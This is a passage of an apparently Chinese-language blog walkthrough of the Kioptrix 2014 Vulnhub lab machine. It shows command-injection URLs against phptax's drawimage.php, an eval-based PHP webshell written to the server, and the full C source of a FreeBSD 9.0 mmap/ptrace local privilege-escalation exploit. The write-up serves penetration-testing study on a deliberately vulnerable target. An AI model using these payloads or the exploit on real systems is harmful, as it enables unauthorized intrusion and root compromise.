class="variable">$fontsize</span>,<span class="variable">$dir</span>,<span class="variable">$x</span>*<span class="variable">$scale</span>+<span class="number">1</span>,<span class="variable">$y</span>*<span class="variable">$scale</span>+<span class="number">1</span>,<span class="variable">$zz</span>,<span class="variable">$ttfont</span>,<span class="variable">$ttext</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">icondrawpng</span>(<span class="params"><span class="variable">$image</span>,<span class="variable">$icon</span>,<span class="variable">$ratio</span>,<span class="variable">$imagescale</span>,<span class="variable">$scale</span>,<span class="variable">$x</span>,<span class="variable">$y</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$handscale</span> = <span class="variable">$scale</span>/<span class="variable">$imagescale</span>*<span class="variable">$ratio</span>;</span><br><span class="line">    <span class="variable">$icon</span> = <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/pictures/<span class="subst">$icon</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$icon</span> = <span class="title function_ invoke__">ImageCreateFromPNG</span>(<span class="variable">$icon</span>);</span><br><span class="line">    <span class="variable">$width</span> = <span class="title function_ invoke__">ImageSX</span>(<span class="variable">$icon</span>);</span><br><span class="line">    <span class="variable">$height</span> = <span class="title function_ invoke__">ImageSY</span>(<span class="variable">$icon</span>);</span><br><span class="line">    <span class="title function_ invoke__">ImageCopyResampled</span>(<span class="variable">$image</span>, <span class="variable">$icon</span>, <span class="variable">$x</span>*<span class="variable">$scale</span>, <span class="variable">$y</span>*<span class="variable">$scale</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="variable">$width</span>*<span class="variable">$handscale</span>, <span class="variable">$height</span>*<span class="variable">$handscale</span>, <span class="variable">$width</span>, <span class="variable">$height</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sets up image scale and size</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">51</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">66</span>;</span><br><span class="line"><span class="variable">$scale</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$imageformat</span>=<span class="string">&quot;png&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sets scale to 50 500dpi if you are making pdf</span></span><br><span class="line"><span class="comment">// if you have less than 256mb on your compter lower this.</span></span><br><span class="line"><span class="variable">$pdf</span>=<span class="variable">$_GET</span>[pdf];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pdf</span>==<span class="string">&quot;make&quot;</span>) <span class="variable">$scale</span>=<span class="number">50</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// draws image</span></span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">ImageCreateTrueColor</span>(<span class="variable">$a</span>*<span class="variable">$scale</span>,<span class="variable">$b</span>*<span class="variable">$scale</span>);</span><br><span class="line"><span class="comment">//$white = ImageColorAllocate($image,255,255,255);</span></span><br><span class="line"><span class="comment">//ImageColorAllocate($image,255,255,255);</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;./files/<span class="subst">$_GET</span>[pfilez]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// makes a png image</span></span><br><span class="line"><span class="variable">$pfilef</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.tob&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="variable">$_GET</span>[pfilez]);</span><br><span class="line"><span class="variable">$pfilep</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.tob&quot;</span>,<span class="string">&quot;.pdf&quot;</span>,<span class="variable">$_GET</span>[pfilez]);</span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[pdf] == <span class="string">&quot;&quot;</span>) <span class="title function_ invoke__">Imagepng</span>(<span class="variable">$image</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[pdf] == <span class="string">&quot;make&quot;</span>) <span class="title function_ invoke__">Imagepng</span>(<span class="variable">$image</span>,<span class="string">&quot;./data/pdf/<span class="subst">$pfilef</span>&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[pdf] == <span class="string">&quot;make&quot;</span>) <span class="title function_ invoke__">exec</span>(<span class="string">&quot;convert ./data/pdf/<span class="subst">$pfilef</span> ./data/pdf/<span class="subst">$pfilep</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ImageDestroy</span>(<span class="variable">$image</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// gd does not like any trailing spaces after this ?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可见 exec() 函数的参数 <code>$pfilef</code> 和 <code>$pfilep</code>
+来自 <code>$_GET[pfilez]</code>，<code>$_GET[pfilez]</code>
+传值前后未进行安全检查，为此可利用 exec 执行恶意命令，示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.3:8080/phptax/drawimage.php?pfilez=xxx;<span class="built_in">id</span> &gt; /tmp/1;&amp;pdf=make</span><br><span class="line">http://192.168.159.3/pChart2.1.3/examples/index.php?Action=View&amp;Script=/tmp/1</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410101010151.jpg" /></p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="获取-shell">2.1. 获取 shell</h3>
+<p>直接反弹shell 未成功！</p>
+<p>经查 <code>www</code> 在 /usr/local/www/apache22/data/pChart2.1.3/
+目录有写权限，示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.3:8080/phptax/drawimage.php?pfilez=xxx;<span class="built_in">echo</span> <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> &gt; ../../data/pChart2.1.3/phpinfo.php;<span class="built_in">ls</span> -al ../../data/pChart2.1.3/ &gt; /tmp/1 ;&amp;pdf=make</span><br><span class="line"></span><br><span class="line">http://192.168.159.3/pChart2.1.3/examples/index.php?Action=View&amp;Script=/tmp/1</span><br><span class="line"></span><br><span class="line">http://192.168.159.3/pChart2.1.3/phpinfo.php</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410101034860.jpg" /></p>
+<p>进一步写个 webshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.3:8080/phptax/drawimage.php?pfilez=xxx;<span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;&#x27;</span> &gt; ../../data/pChart2.1.3/webshell.php;<span class="built_in">ls</span> -al ../../data/pChart2.1.3/ &gt; /tmp/1 ;&amp;pdf=make</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410101048418.jpg" /></p>
+<p>基于蚁剑反弹个 shell 提权</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410101058771.jpg" /></p>
+<h3 id="提权">2.2. 提权</h3>
+<p><code>uname -a</code> 得系统版本 FreeBSD 9.0-RELEASE</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">uname</span> -a</span><br><span class="line">FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE <span class="comment">#0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64</span></span><br></pre></td></tr></table></figure>
+<p>查询相关漏洞 <code>searchsploit FreeBSD 9.0</code> 得
+<code>FreeBSD 9.0 &lt; 9.1 - 'mmap/ptrace' Local Privilege Escalation</code>
+【<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/26368">FreeBSD 9.0 &lt;
+9.1 - 'mmap/ptrace' Local Privilege Escalation - FreeBSD local
+Exploit</a>】</p>
+<p>26368.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * FreeBSD 9.&#123;0,1&#125; mmap/ptrace exploit</span></span><br><span class="line"><span class="comment"> * by Hunger &lt;fbsd9lul@hunger.hu&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Happy Birthday FreeBSD!</span></span><br><span class="line"><span class="comment"> * Now you are 20 years old and your security is the same as 20 years ago... :)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Greetings to #nohup, _2501, boldi, eax, johnny_b, kocka, op, pipacs, prof,</span></span><br><span class="line"><span class="comment"> *              sd, sghctoma, snq, spender, s2crew and others at #hekkcamp:</span></span><br><span class="line"><span class="comment"> *                      I hope we&#x27;ll meet again at 8@1470n ;)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Special thanks to proactivesec.com</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SH <span class="string">&quot;/bin/sh&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TG <span class="string">&quot;/usr/sbin/timedc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> ac, <span class="type">char</span> **av)</span> &#123;</span><br><span class="line">   <span class="type">int</span> from_fd, to_fd, status;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">ptrace_io_desc</span> <span class="title">piod</span>;</span></span><br><span class="line">   <span class="type">char</span> *s, *d;</span><br><span class="line">   <span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (geteuid() == <span class="number">0</span>)  &#123;</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        execl(SH, SH, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;FreeBSD 9.&#123;0,1&#125; mmap/ptrace exploit\n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;by Hunger &lt;fbsd9lul@hunger.hu&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ((from_fd = open(av[<span class="number">0</span>], O_RDONLY)) == <span class="number">-1</span> ||</span><br><span class="line">        (to_fd = open(TG, O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;open&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (stat(av[<span class="number">0</span>], &amp;st) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">2</span>, <span class="string">&quot;stat&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (((s = mmap(<span class="literal">NULL</span>, (<span class="type">size_t</span>)st.st_size, PROT_READ,</span><br><span class="line">        MAP_SHARED, from_fd, (<span class="type">off_t</span>)<span class="number">0</span>)) == MAP_FAILED) ||</span><br><span class="line">                (d = mmap(<span class="literal">NULL</span>, (<span class="type">size_t</span>)st.st_size, PROT_READ,</span><br><span class="line">                        MAP_SHARED|MAP_NOSYNC, to_fd, (<span class="type">off_t</span>)<span class="number">0</span>)) == MAP_FAILED)</span><br><span class="line">                                err(<span class="number">3</span>, <span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ((pid = fork()) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">4</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ptrace(PT_TRACE_ME, pid, <span class="literal">NULL</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">                err(<span class="number">5</span>, <span class="string">&quot;ptraceme&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (ptrace(PT_ATTACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">6</span>, <span class="string">&quot;ptattach&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (wait(&amp;status) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">7</span>, <span class="string">&quot;wait&quot;</span>);</span><br><span class="line"></span><br><span class="line">   piod.piod_op = PIOD_WRITE_D;</span><br><span class="line">   piod.piod_offs = d;</span><br><span class="line">   piod.piod_addr = s;</span><br><span class="line">   piod.piod_len  = st.st_size;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (ptrace(PT_IO, pid, (<span class="type">caddr_t</span>)&amp;piod, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">8</span>, <span class="string">&quot;ptio&quot;</span>);</span><br><span class="line"></span><br><span class="line">   execl(TG, TG, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>靶机已安装 gcc ，传至靶机编译提权</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410101128401.jpg" /></p>
+<p>获得 root 权限</p>
+<p>提权漏洞 2：<a
+target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/28718">FreeBSD 9.0 - Intel
+SYSRET Kernel Privilege Escalation - FreeBSD local Exploit</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Phantom
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/10/10/Kioptrix%202014/" title="Kioptrix: 2014">https://z9m8r8.github.io/2024/10/10/Kioptrix 2014/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+              <a href="/tags/RCE/" rel="tag"><i class="fa fa-tag"></i> RCE</a>
+              <a href="/tags/pChart-2-1-3/" rel="tag"><i class="fa fa-tag"></i> pChart 2.1.3</a>
+              <a href="/tags/phptax-0-8/" rel="tag"><i class="fa fa-tag"></i> phptax 0.8</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/10/06/Kioptrix%20Level%201.3/" rel="prev" title="Kioptrix: Level 1.3">
+                  <i class="fa fa-angle-left"></i> Kioptrix: Level 1.3
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Phantom</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">294k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">17:50</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/10/10/Kioptrix%202014/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
